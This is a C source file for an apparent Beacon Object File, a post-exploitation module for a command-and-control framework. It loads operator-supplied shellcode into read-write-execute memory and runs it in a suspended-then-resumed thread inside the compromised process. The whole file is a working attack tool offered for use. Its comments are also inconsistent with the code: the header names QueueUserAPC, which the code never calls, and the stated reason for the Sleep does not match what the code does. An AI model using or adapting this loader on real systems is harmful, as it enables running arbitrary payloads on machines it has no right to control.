/*
 * shellcode_exec_inject.c - Shellcode execution via self-injection.
 *
 * Injects shellcode into current process using QueueUserAPC to ensure
 * shellcode stays alive after BOF returns.
 *
 * Build (MinGW-w64):
 *   x86_64-w64-mingw32-gcc -c shellcode_exec_inject.c -o shellcode_exec_inject.o
 *
 * Usage from server:
 *   Upload shellcode_exec_inject.o, set args = raw shellcode bytes
 */

#include <windows.h>
#include "beacon.h"

DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID, SIZE_T, DWORD, DWORD);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateThread(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$ResumeThread(HANDLE);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT VOID   WINAPI KERNEL32$Sleep(DWORD);

#define MEM_COMMIT_VAL     0x00001000
#define MEM_RESERVE_VAL    0x00002000
#define PAGE_EXECUTE_READWRITE_VAL 0x40
#define CREATE_SUSPENDED 0x00000004

static void bof_memcpy(void* dst, const void* src, unsigned long long n) {
    unsigned char* d = (unsigned char*)dst;
    const unsigned char* s = (const unsigned char*)src;
    while (n--) *d++ = *s++;
}

void go(char* args, int alen)
{
    char* shellcode_data = NULL;
    int shellcode_len = 0;

    if (args != NULL && alen >= 2) {
        datap parser;
        BeaconDataParse(&parser, args, alen);
        shellcode_data = BeaconDataExtract(&parser, &shellcode_len);
    }

    if (shellcode_data == NULL || shellcode_len <= 0) {
        BeaconOutput(CALLBACK_ERROR, "No shellcode provided\n", 21);
        return;
    }

    if (shellcode_len > 10 * 1024 * 1024) {
        BeaconOutput(CALLBACK_ERROR, "Shellcode too large (max 10MB)\n", 32);
        return;
    }

    /* Allocate RWX memory - this memory persists after BOF returns */
    LPVOID exec_mem = KERNEL32$VirtualAlloc(
        NULL,
        shellcode_len,
        MEM_COMMIT_VAL | MEM_RESERVE_VAL,
        PAGE_EXECUTE_READWRITE_VAL
    );

    if (exec_mem == NULL) {
        BeaconOutput(CALLBACK_ERROR, "VirtualAlloc failed\n", 20);
        return;
    }

    /* Copy shellcode to persistent memory */
    bof_memcpy(exec_mem, shellcode_data, shellcode_len);

    /* Create suspended thread */
    HANDLE hThread = KERNEL32$CreateThread(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)exec_mem,
        NULL,
        CREATE_SUSPENDED,
        NULL
    );

    if (hThread == NULL) {
        BeaconOutput(CALLBACK_ERROR, "CreateThread failed\n", 20);
        return;
    }

    /* Give BOF time to return before resuming thread */
    /* This ensures BOF code is unloaded before shellcode runs */
    KERNEL32$Sleep(100);

    /* Resume thread - shellcode will run after BOF returns */
    KERNEL32$ResumeThread(hThread);
    KERNEL32$CloseHandle(hThread);

    BeaconOutput(CALLBACK_OUTPUT, "Shellcode injected (delayed start)\n", 36);
}
